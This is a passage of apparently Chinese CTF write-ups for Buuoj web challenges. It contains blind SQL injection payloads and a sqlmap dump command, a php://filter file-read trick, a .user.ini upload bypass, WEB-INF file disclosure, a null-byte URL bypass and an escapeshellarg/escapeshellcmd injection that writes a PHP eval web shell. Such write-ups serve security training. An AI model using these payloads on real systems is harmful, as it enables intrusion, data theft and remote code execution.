    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no sql connection"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p><code>guest.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/guest.html"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p><code>info.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/info.html"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>ffffllllaaaaggg</code>被过滤</p>
<h5 id="利用-parse-url解析漏洞"><a href="#利用-parse-url解析漏洞" class="headerlink" title="利用 parse_url解析漏洞"></a>利用 <code>parse_url</code>解析漏洞</h5><p> 当url种出现下面这种情况的url，会解析错误，返回false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code> </p>
<p><code>ffffllllaaaaggg.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p><code>m4aaannngggeee.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/upload.html"</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span></code></pre>



<p>访问<code>./templates/upload.html</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129211243615.png" class="" title="image-20201129211243615" loading="lazy">

<p>赶紧上传个，结果白高兴一场</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129211356792.png" class="" title="image-20201129211356792" loading="lazy">

<p>利用user.php再读<code>upllloadddd.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
<span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span><span class="token operator">.</span><span class="token variable">$picdata</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p>访问<code>./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129212543344.png" class="" title="image-20201129212543344" loading="lazy">

<p>确认存在文件上传考点，回去找上传点，访问<code>./user.php?page=m4aaannngggeee</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129212613725.png" class="" title="image-20201129212613725" loading="lazy">

<p>上传发现</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129212720648.png" class="" title="image-20201129212720648" loading="lazy">

<p>表明无法通过上传一句话木马获得shell</p>
<p>后来分析代码发现漏洞</p>
<h5 id="文件名代码执行漏洞"><a href="#文件名代码执行漏洞" class="headerlink" title="文件名代码执行漏洞"></a>文件名代码执行漏洞</h5><img src="/article/Buuoj-WEB-Write-up/image-20201129212856576.png" class="" title="image-20201129212856576" loading="lazy">

<p>扫目录</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129213023625.png" class="" title="image-20201129213023625" loading="lazy">

<p>flag即在<code>flag_233333</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129213121552.png" class="" title="image-20201129213121552" loading="lazy">

<p>成功</p>
<hr>
<h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>打开</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202104315913.png" class="" title="image-20201202104315913" loading="lazy">

<p>有登陆，尝试登陆界面sql注入</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202104343337.png" class="" title="image-20201202104343337" loading="lazy">

<p>查看源码，在webpack发现猫腻</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202104718292.png" class="" title="image-20201202104718292" loading="lazy">

<p>登录界面注入无果<img src="/article/Buuoj-WEB-Write-up/image-20201202104751986.png" class="" title="image-20201202104751986" loading="lazy"></p>
<p>转<code>content_list.php</code></p>
<p>发现请求文章时会带id参数，尝试注入</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202105153401.png" class="" title="image-20201202105153401" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201202105351447.png" class="" title="image-20201202105351447" loading="lazy">

<p>确认存在注入</p>
<p>过滤了<code>+</code> <code>空格</code> <code>and</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202105230126.png" class="" title="image-20201202105230126" loading="lazy">

<p> 输入数据库不存在的id或产生语法时没有回显，初步判断为布尔盲注</p>
<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>写个tamper替换空格等字符</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python2 sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn/backend/content_detail.php?id=0"</span>  <span class="token parameter variable">--delay</span><span class="token operator">=</span><span class="token number">0.07</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>mysql <span class="token parameter variable">--technique</span><span class="token operator">=</span>B <span class="token parameter variable">--tamper</span><span class="token operator">=</span>mytamper.py --user-agent<span class="token operator">=</span><span class="token string">"chrome"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--dump</span></code></pre>

<p>参数：</p>
<pre class="language-none"><code class="language-none">--delay 延迟注入，网站快速注入会返回429，Too Many Requirements
--dbms 数据库类型
--technique 注入方式，这里B指bool布尔盲注
--tamper 使用的tamper
--user-agent 题目判断UA
--risk 风险等级
--dump 数据库全部拖下来</code></pre>

<p>运行提示</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> appears to be <span class="token string">'OR boolean-based blind - WHERE or HAVING clause'</span> injectable</code></pre>

<p>证实为布尔盲注</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202110359111.png" class="" title="image-20201202110359111" loading="lazy">

<p>发现跑出了数据库名<code>news</code>但跑不出表名</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202110529783.png" class="" title="image-20201202110529783" loading="lazy">

<p>参考师傅的答案，写脚本开始跑</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre>

<p>一段一段分析</p>
<pre class="language-none"><code class="language-none">database() : 数据库
(select(database()) : 选择数据库
substr函数 : 指截取参数1字符串，从参数2的位置开始截取参数3位
substr((select(database())),&#123;&#125;,1) : 指从数据库名第&#123;&#125;的位置截取一位
ascii(substr((select(database())),&#123;&#125;,1)) : 指转化为ASCII码值
select : 如下图所示
select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;) : select ascii&#x3D;&#123;&#125;，判断是否和某个ascii码值相等，如图
if(a,1,0) : 相当于三目运算符 :? ,即 a:1?0
^ : 异或符</code></pre>



<img src="/article/Buuoj-WEB-Write-up/image-20201202112853423.png" class="" title="image-20201202112853423" loading="lazy">



<img src="/article/Buuoj-WEB-Write-up/image-20201202112804610.png" class="" title="image-20201202112804610" loading="lazy">



<img src="/article/Buuoj-WEB-Write-up/image-20201202112928978.png" class="" title="image-20201202112928978" loading="lazy">



<p>很明显，第一个<code>&#123;&#125;</code>指的是数据库名的第i位，第二个<code>&#123;&#125;</code>指对第i的ASCII码值进行比较</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202110930572.png" class="" title="image-20201202110930572" loading="lazy">

<p>数据库名为<code>news</code>，继续跑表名</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;news&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre>



<img src="/article/Buuoj-WEB-Write-up/image-20201202113058557.png" class="" title="image-20201202113058557" loading="lazy">

<p>再跑列名</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;admin&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre>



<img src="/article/Buuoj-WEB-Write-up/image-20201202113123832.png" class="" title="image-20201202113123832" loading="lazy">

<p>跑数据了</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(id))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#
1^if((select(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#
1^if((select(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#
1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#
</code></pre>



<p>其实没必要跑那么多，（跑着好玩</p>
<p>出来表有两行</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202113806290.png" class="" title="image-20201202113806290" loading="lazy">

<p><code>username</code>：3ab8d14c,dcaf5eed</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202114112390.png" class="" title="image-20201202114112390" loading="lazy">

<p><code>password</code>：2a790c21,f285e92a</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202114324916.png" class="" title="image-20201202114324916" loading="lazy">

<p><code>is_enable</code>：0,1</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202114435825.png" class="" title="image-20201202114435825" loading="lazy">

<p>直接去拿enbale的登陆即可</p>
<p>表结构是这样的</p>
<p>数据库名:news</p>
<p>表名:admin</p>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>is_enable</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>3ab8d14c</td>
<td>2a790c21</td>
<td>0</td>
</tr>
<tr>
<td>2</td>
<td>dcaf5eed</td>
<td>f285e92a</td>
<td>1</td>
</tr>
</tbody></table>
<p>登陆成功</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201202114303580.png" class="" title="image-20201202114303580" loading="lazy">



<hr>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><img src="/article/Buuoj-WEB-Write-up/image-20201203151206446.png" class="" title="image-20201203151206446" loading="lazy">

<p>上来很直白，传个码看看</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201203151245517.png" class="" title="image-20201203151245517" loading="lazy">

<p>改后缀</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201203151428059.png" class="" title="image-20201203151428059" loading="lazy">文件内容还检查，加`GIF98a`可以

<img src="/article/Buuoj-WEB-Write-up/image-20201203151803538.png" class="" title="image-20201203151803538" loading="lazy">

<p>会返回上传文件夹目录的数组，目录穿越上传不行，php过滤死了，传含码图片，过滤<code>&lt;?</code>，而<code>&lt;%</code>也不解析，路走不通。</p>
<p>传个<code>.htaccess</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201203152651182.png" class="" title="image-20201203152651182" loading="lazy">

<p>但是好像没解析…</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201203152715211.png" class="" title="image-20201203152715211" loading="lazy">

<p>经查询，nginx使用<code>.user.ini</code>自定义设置</p>
<p>于是传个<code>.user.ini</code></p>
<pre class="language-ini" data-language="ini"><code class="language-ini">.user.ini

GIF89a                  //绕过exif_imagetype()

<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">gyy.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span>
<span class="token key attr-name">auto_append_file</span><span class="token punctuation">=</span><span class="token value attr-value">gyy.jpg  //解析后进行包含，它包含在所有php文件执行后执行</span></code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201203161427723.png" class="" title="image-20201203161427723" loading="lazy">

<p>ok,再传码</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201203161504788.png" class="" title="image-20201203161504788" loading="lazy">

<p>然后直接访问<code>index.php</code>就可以了，因为<code>.user.ini</code>里写了，提前加载了<code>gyy.jpg</code>文件，而里面是我们写好的码，shell直接连上</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201203161829593.png" class="" title="image-20201203161829593" loading="lazy">



<hr>
<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。</p>
<p>考点：<strong>WEB-INF&#x2F;web.xml泄露</strong></p>
<pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:
&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。
&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201208175741483.png" class="" title="image-20201208175741483" loading="lazy">

<p>打开为登陆界面，SQL注入无果，点<code>help</code>，发现url变化为<code>./Download?filename=help.docx</code></p>
<p>猜测源码泄露，尝试伪协议读取源码<code>php://filter/convert.base64-encode/resource=help.docx</code>发现报错为<code>java.io.FileNotFoundException:&#123;php://filter/convert.base64-encode/resource=help.docx&#125;</code></p>
<p>结合题目名，猜测JAVA-WEB应用</p>
<p>报错是tomcat，尝试包含tomcat的web.xml，更改方式为POST请求，传参<code>filename=WEB-INF/web.xml</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208180232236.png" class="" title="image-20201208180232236" loading="lazy">

<p>尝试请求<code>/Flag</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208180450678.png" class="" title="image-20201208180450678" loading="lazy">

<p> 结合tomcat的项目存放路径经验试试下载FlagController.class </p>
<p>传参<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208180558946.png" class="" title="image-20201208180558946" loading="lazy">

<p>直接访问下载也行，抓包请求也行，base64解码一下发现flag</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208180825474.png" class="" title="image-20201208180825474" loading="lazy">

<hr>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>nmap工具的利用</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>考两个函数<code>escapeshellarg</code></p>
<p> <strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </p>
<p><code>escapeshellarg</code></p>
<p> <strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
<p>然而之前就爆出了漏洞… 当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。 </p>
<p>如</p>
<p><code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></p>
<p>相当于<code>curl 127.0.0.1\ -v -d a=1&#39;</code></p>
<p>字符转义了</p>
<p>查阅nmap帮助手册<code>nmap -h</code></p>
<p>首先想读取文件，利用<code>-iL</code>参数</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208184745868.png" class="" title="image-20201208184745868" loading="lazy">

<p>发现不行，cmd可以，但执行后没有回显，以下为本地环境</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208190824314.png" class="" title="image-20201208190824314" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201208190921276.png" class="" title="image-20201208190921276" loading="lazy">

<p>关键在于没法构造，毕竟两函数有转义的，于是有了另一种方法，输出。</p>
<p>利用<code>-oG</code>参数</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208184653935.png" class="" title="image-20201208184653935" loading="lazy">

<p>直接写一句话木马就好了</p>
<p>payload&#x3D;<code>./?host=&#39;&lt;?php eval($_POST[gyy]);?&gt; -oG shell.php &#39;</code></p>
<p>最后和单引号要有空格，因为让system执行时最后的参数是<code>shell.php</code>而不是<code>shell.php\&#39;</code>，因为 <strong>escapeshellarg()<strong>和</strong>escapeshellcmd()</strong> 有转义，单引号是因为函数会检查字符串匹配引号的情况</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208193014462.png" class="" title="image-20201208193014462" loading="lazy">

<p>查看文件</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208193048924.png" class="" title="image-20201208193048924" loading="lazy">

<p>拿到shell</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208193135957.png" class="" title="image-20201208193135957" loading="lazy">

<p>本地文件是这样的，可以看到包含了一句话木马</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208193533711.png" class="" title="image-20201208193533711" loading="lazy">

<hr>
<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h5 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h5><p> <strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\ 0）字符，则URL将被静默地<strong>截断</strong>。<strong>这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</strong> </p>
<p>题目讲明为CVE，排除SSRF</p>
<p>在响应头中发现hint</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208195802041.png" class="" title="image-20201208195802041" loading="lazy">

<p>访问<code>./?url=http://localhost%00www.ctfhub.com</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208195922474.png" class="" title="image-20201208195922474" loading="lazy">

<p><code>Tips: Host must be end with &#39;123&#39;</code></p>
<p>访问<code>./?url=http://127.0.0.123%00www.ctfhub.com</code>即可</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208200037696.png" class="" title="image-20201208200037696" loading="lazy">

<p>主要考一个CVE，记录一下</p>
<hr>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露</p>
<p>一点提示都没有！可恶</p>
<p><code>robots.txt</code>没有，响应头没有，随手访问了个<code>./.git/</code>结果真有，直接上GitHack</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201208202421537.png" class="" title="image-20201208202421537" loading="lazy">

<p>强烈谴责！GitHack重新下个就好了，旧的这个还不管用，GitHack还有假的？？？</p>
